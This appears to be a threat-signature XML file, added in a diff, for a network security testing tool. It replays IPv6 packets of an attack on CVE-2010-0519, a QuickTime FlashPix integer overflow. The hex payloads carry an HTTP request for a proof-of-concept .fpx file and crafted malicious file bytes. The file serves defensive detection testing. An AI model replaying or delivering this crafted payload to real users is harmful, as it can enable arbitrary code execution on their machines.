@@ -1,0 +1,100 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Apple QuickTime FlashPix Movie File Integer Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="An integer overflow vulnerability exists in Apple QuickTime. The vulnerability is due to an error when handling FlashPix encoded movie files. This vulnerability may be exploited by remote attackers by enticing a user to view specially crafted FlashPix files. Successful exploitation of this vulnerability can lead to arbitrary code execution in the context of the currently logged in user. An unsuccessful code execution attempt can lead to abnormal termination of the vulnerable program. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Code_Execution/Integer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS/IMAP/POP3/SMB/CIFS/SMTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Apple"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Apple_Quicktime"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Apple_Quicktime_Prior_to_7.6.6"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2010-0519"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="9d1030e32436da8c57868c10d92893c9"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634064215192900205"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1270891807" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIPv6" type="ImperfectControls.IPv6Address" value="null" index="L"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="M"/>
+    <NamedVar name="sourceIPv6" type="ImperfectControls.IPv6Address" value="null" index="O"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="L"/>
+      <for index="M"/>
+      <for index="O"/>
+    </for>
+    <for index="F">
+      <for index="L"/>
+      <for index="M"/>
+      <for index="O"/>
+    </for>
+    <for index="BL">
+      <for index="L"/>
+      <for index="M"/>
+      <for index="O"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:0C:29:F5:87:78" destMac="00:17:A4:AA:F4:93" pktType="0800">
+      <IPv6 Version="6" InternetHeaderLength="05" TypeofService="00" TotalLength="0192" Identification="1DBD" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="79E9" srcIP="$sourceIPv6" destIP="$destIPv6" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="1144" destPort="$HTTPdestPort" SeqNumber="A4B531F7" AckNumber="6DB1ED0C" HeaderLength="05" WindowSize="FAF0" Checksum="180C" UrgentPointer="0000" Options="" Payload="474554202F7E766C617572656E732F706F632E66707820485454502F312E310D0A486F73743A203137322E31362E312E31310D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F77733B20553B2057696E646F7773204E5420352E313B20656E2D555329204170706C655765624B69742F3533312E3920284B48544D4C2C206C696B65204765636B6F292056657273696F6E2F342E302E33205361666172692F3533312E392E310D0A4163636570743A206170706C69636174696F6E2F786D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C746578742F68746D6C3B713D302E392C746578742F706C61696E3B713D302E382C696D6167652F706E672C2A2F2A3B713D302E350D0A4163636570742D4C616E67756167653A20656E2D55530D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,2">
+    <Output index="F" Count="">
+      <Ethernet srcMac="00:17:A4:AA:F4:93" destMac="00:0C:29:F5:87:78" pktType="0800">
+        <IPv6 Version="6" InternetHeaderLength="05" TypeofService="00" TotalLength="0167" Identification="F525" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="E2AB" srcIP="$destIPv6" destIP="$sourceIPv6" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1144" SeqNumber="6DB1ED0C" AckNumber="A4B53361" HeaderLength="05" WindowSize="1920" Checksum="1115" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205468752C2030382041707220323031302031343A34323A343420474D540D0A5365727665723A204170616368652F322E302E3532202843656E744F5329205048502F342E332E390D0A4C6173742D4D6F6469666965643A205468752C2030382041707220323031302031343A30393A333420474D540D0A455461673A2022313631633030312D31316130302D3361363961333830220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A2037323139320D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F706C61696E3B20636861727365743D5554462D380D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="BL" Count="">
+      <Ethernet srcMac="00:17:A4:AA:F4:93" destMac="00:0C:29:F5:87:78" pktType="0800">
+        <IPv6 Version="6" InternetHeaderLength="05" TypeofService="00" TotalLength="02B4" Identification="F589" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="E0FA" srcIP="$destIPv6" destIP="$sourceIPv6" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1144" SeqNumber="6DB305BF" AckNumber="A4B53361" HeaderLength="05" WindowSize="1920" Checksum="8CB9" UrgentPointer="0000" Options="" Payload="03030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030202020202020303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030101010303030303030303030303030303030303030303030303030303030303030202020202020202020303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
